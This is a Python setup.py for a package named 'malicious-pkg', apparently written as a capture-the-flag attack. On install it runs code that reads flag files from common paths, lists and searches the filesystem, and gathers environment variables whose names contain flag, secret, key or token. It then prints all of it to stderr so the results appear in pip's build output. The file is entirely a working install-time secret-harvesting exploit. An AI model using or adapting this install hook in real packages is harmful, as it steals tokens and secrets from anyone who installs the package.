import subprocess, sys, os, urllib.request, json

# Try to read flag from common locations
flag_paths = ["/flag", "/flag.txt", "/root/flag.txt", "/etc/flag", "/home/flag.txt", "/app/flag.txt", "/app/flag"]

found_flags = []
for path in flag_paths:
    try:
        with open(path) as f:
            content = f.read()
            found_flags.append({"path": path, "content": content})
    except:
        pass

# Also try env
flag_env = os.environ.get("FLAG")
if flag_env:
    found_flags.append({"path": "env:FLAG", "content": flag_env})

# List root directory
try:
    result = subprocess.run(["ls", "-la", "/"], capture_output=True, text=True, timeout=5)
    root_ls = result.stdout
except:
    root_ls = "error"

# Try find
try:
    result = subprocess.run(["find", "/", "-name", "flag*", "-maxdepth", "5"], capture_output=True, text=True, timeout=10)
    find_output = result.stdout
except:
    find_output = "error"

# Also check env
env_vars = " ".join([f"{k}={v}" for k, v in sorted(os.environ.items()) if any(x in k.lower() for x in ["flag", "secret", "key", "token", "ctf"])])

# Output everything to stderr so it appears in pip output
data = f"""
=== FLAGS FOUND ===
{found_flags}
=== ROOT DIR ===
{root_ls}
=== FIND FLAG FILES ===
{find_output}
=== ENV VARS ===
{env_vars}
"""
print(data, file=sys.stderr)

from setuptools import setup, find_packages
setup(
    name="malicious-pkg",
    version="0.1.0",
    packages=find_packages(where="src"),
    package_dir={"": "src"},
)
